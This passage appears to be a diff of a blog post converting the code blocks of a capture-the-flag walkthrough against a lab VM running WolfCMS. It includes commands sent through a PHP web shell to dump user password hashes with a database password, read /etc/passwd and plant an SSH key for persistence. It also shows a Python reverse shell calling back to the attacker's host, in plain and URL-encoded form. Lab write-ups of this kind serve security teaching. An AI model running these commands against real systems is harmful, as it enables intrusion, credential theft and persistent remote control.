+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e&lt;/a>'select+*+from+user'&rdquo;
+</span><span class='line'>id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
+</span><span class='line'>1       Administrator   &lt;a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#97;&#100;&#109;&#x69;&#110;&#x40;&#x79;&#111;&#117;&#x72;&#115;&#x69;&#x74;&#101;&#x2e;&#x63;&#x6f;&#x6d;">&#97;&#100;&#109;&#x69;&#x6e;&#x40;&#121;&#111;&#x75;&#x72;&#115;&#105;&#116;&#101;&#46;&#99;&#x6f;&#109;&lt;/a>      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Nothing interesting here, there is only one user and we already know his password.</p>
 
 <p>We noticed that the user <code>www-data</code> has shell access:
-{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd</a>&rdquo;
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-syslog:x:101:103::/home/syslog:/bin/false
-messagebus:x:102:105::/var/run/dbus:/bin/false
-whoopsie:x:103:106::/nonexistent:/bin/false
-landscape:x:104:109::/var/lib/landscape:/bin/false
-sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
-sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
-mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd&lt;/a>&rdquo;
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
+</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
+</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
+</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Next idea is to upload ssh authorization key and log in via ssh.</p>
 
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=id">http://192.168.80.169/wolfcms/public/a.php?cmd=id</a>&rdquo;
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=id">http://192.168.80.169/wolfcms/public/a.php?cmd=id&lt;/a>&rdquo;
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data</a>&rdquo;
-total 24
-drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
-drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
--rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
--rw-r&ndash;r&ndash;  1 root root   21 Dec  5 06:05 index.php
--rw-r&ndash;r&ndash;  1 root root   45 Dec  5 06:05 robots.txt
-drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms</p>
-
-<p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh</a>&rdquo;
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data</a>&rdquo;
-total 28
-drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
-drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
-drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
--rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
--rw-r&ndash;r&ndash;  1 root     root       21 Dec  5 06:05 index.php
--rw-r&ndash;r&ndash;  1 root     root       45 Dec  5 06:05 robots.txt
-drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data&lt;/a>&rdquo;
+</span><span class='line'>total 24
+</span><span class='line'>drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
+</span><span class='line'>drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
+</span><span class='line'>-rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   21 Dec  5 06:05 index.php
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   45 Dec  5 06:05 robots.txt
+</span><span class='line'>drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh&lt;/a>&rdquo;
+</span><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data&lt;/a>&rdquo;
+</span><span class='line'>total 28
+</span><span class='line'>drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
+</span><span class='line'>drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
+</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
+</span><span class='line'>-rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root     root       21 Dec  5 06:05 index.php
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root     root       45 Dec  5 06:05 robots.txt
+</span><span class='line'>drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms</span></code></pre></td></tr></table></div></figure></p>
 
 <p>Creating ssh keypair:
-{% codeblock %}
-root@kali32:~$ ssh-keygen -P &ldquo;&rdquo; -f blabla
-Generating public/private rsa key pair.
-Your identification has been saved in blabla.
-Your public key has been saved in blabla.pub.
-The key fingerprint is:
-4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
-The key&rsquo;s randomart image is:
-+&mdash;[RSA 2048]&mdash;-+
-|          o     .|
-|           + E + |
-|          o   . +|
-|         o . . o+|
-|        S . o o.o|
-|           . + o |
-|          . * + o|
-|           + = ..|
-|            ..o. |
-+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</p>
-
-<p>root@kali32:~$ cat blabla.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh-keygen -P &ldquo;&rdquo; -f blabla
+</span><span class='line'>Generating public/private rsa key pair.
+</span><span class='line'>Your identification has been saved in blabla.
+</span><span class='line'>Your public key has been saved in blabla.pub.
+</span><span class='line'>The key fingerprint is:
+</span><span class='line'>4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
+</span><span class='line'>The key&rsquo;s randomart image is:
+</span><span class='line'>+&mdash;[RSA 2048]&mdash;-+
+</span><span class='line'>|          o     .|
+</span><span class='line'>|           + E + |
+</span><span class='line'>|          o   . +|
+</span><span class='line'>|         o . . o+|
+</span><span class='line'>|        S . o o.o|
+</span><span class='line'>|           . + o |
+</span><span class='line'>|          . * + o|
+</span><span class='line'>|           + = ..|
+</span><span class='line'>|            ..o. |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ cat blabla.pub
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure></p>
 
 <p>To encode <code>+</code> characters, otherwise they are interpreted as spaces in url:
-{% codeblock %}
-root@kali32:~$ cat blabla.pub  | sed &rsquo;s#+#%2b#g&#8217;
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ cat blabla.pub  | sed &rsquo;s#+#%2b#g'
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX root@kali32</span></code></pre></td></tr></table></div></figure></p>
 
 <p>To store public key as <code>authorized_keys</code>:
-{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+</a>&lsquo;ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX&rsquo;>~www-data/.ssh/authorized_keys&rdquo;
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+&lt;/a>&lsquo;ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq%2byGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA%2b1i14Mfp6kxskoW5/%2b8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k%2brY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid%2b8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX&rsquo;>~www-data/.ssh/authorized_keys&rdquo;</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We verify the successful upload:
-{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys</a>&rdquo;
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+~www-data/.ssh/authorized_keys&lt;/a>&rdquo;
+</span><span class='line'>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDATSX0uMozctGYI0WxqTojb1MailETRZqbrxLlhkL8XXPPlDh2uaUaRZUbVpDRbCxiG0ml7/gU9ENxL355lfGVLcpRrq+yGMJlGEHbmVNJJ76kW7dK1vaXtZ4Vk44mhVDfMhx3gjShA+1i14Mfp6kxskoW5/+8WusXXBfGY9lX3gGH4/0z8CRs2pUjhlk73hdYu6hHqOtm5xlv/JBCXg0Mlzp48k+rY21ctiTHDuoCA/SRV5m0NO9eobuJf/vW5WVIGuQoIWKQvkjxXYLid+8F5IayNYo3xYsaZo81EN4NcwY3TX3CCrF2jfO1UKQn0r4nrsISABDm9CdbeficBwnX</span></code></pre></td></tr></table></div></figure></p>
 
 <p>It does not work, the server is still asking password, even when we try to set more restricted permission:
-{% codeblock %}
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys</a>&rdquo;
-root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;<a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh</a>&rdquo;</p>
-
-<p>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
-<a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#x77;&#119;&#x77;&#x2d;&#x64;&#97;&#116;&#97;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#56;&#48;&#x2e;&#x31;&#x36;&#x39;">&#119;&#x77;&#x77;&#45;&#x64;&#x61;&#x74;&#x61;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x38;&#48;&#x2e;&#x31;&#x36;&#x39;</a>&rsquo;s password:
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+600+~www-data/.ssh/authorized_keys&lt;/a>&rdquo;
+</span><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=chmod+700+~www-data/.ssh&lt;/a>&rdquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ ssh -i blabla 192.168.80.169 -l www-data
+</span><span class='line'>&lt;a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#119;&#119;&#119;&#x2d;&#x64;&#97;&#x74;&#x61;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x38;&#x30;&#46;&#49;&#x36;&#x39;">&#119;&#x77;&#119;&#x2d;&#x64;&#x61;&#x74;&#97;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x38;&#x30;&#46;&#49;&#x36;&#x39;&lt;/a>&rsquo;s password:</span></code></pre></td></tr></table></div></figure></p>
 
 <p>We come back to this later. Trying different payload, we encode the following
 command and invoke via our backdoor, the second output is ascii encoded using
 Burp Encoder:
-{% codeblock lang:python %}
-python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; 192.168.80.137 1400
-{% endcodeblock %}</p>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">socket</span><span class="o">,</span><span class="nn">os</span><span class="o">,</span><span class="nn">pty</span><span class="p">;</span> <span class="n">_</span><span class="p">,</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">;</span> <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)));</span> <span class="p">[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span> <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">80.137</span> <span class="mi">1400</span>
+</span></code></pre></td></tr></table></div></figure></p>
 
-<p>{% codeblock %}
-%70%79%74%68%6f%6e%20%2d%63%20%22%69%6d%70%6f%72%74%20%73%79%73%2c%73%6f%63%6b%65%74%2c%6f%73%2c%70%74%79%3b%20%5f%2c%69%70%2c%70%6f%72%74%3d%73%79%73%2e%61%72%67%76%3b%20%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%29%3b%20%73%2e%63%6f%6e%6e%65%63%74%28%28%69%70%2c%69%6e%74%28%70%6f%72%74%29%29%29%3b%20%5b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%66%64%29%20%66%6f%72%20%66%64%20%69%6e%20%28%30%2c%31%2c%32%29%5d%3b%20%70%74%79%2e%73%70%61%77%6e%28%27%2f%62%69%6e%2f%62%61%73%68%27%29%22%20%31%39%32%2e%31%36%38%2e%38%30%2e%31%33%37%20%31%34%30%30
-{% endcodeblock %}</p>
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
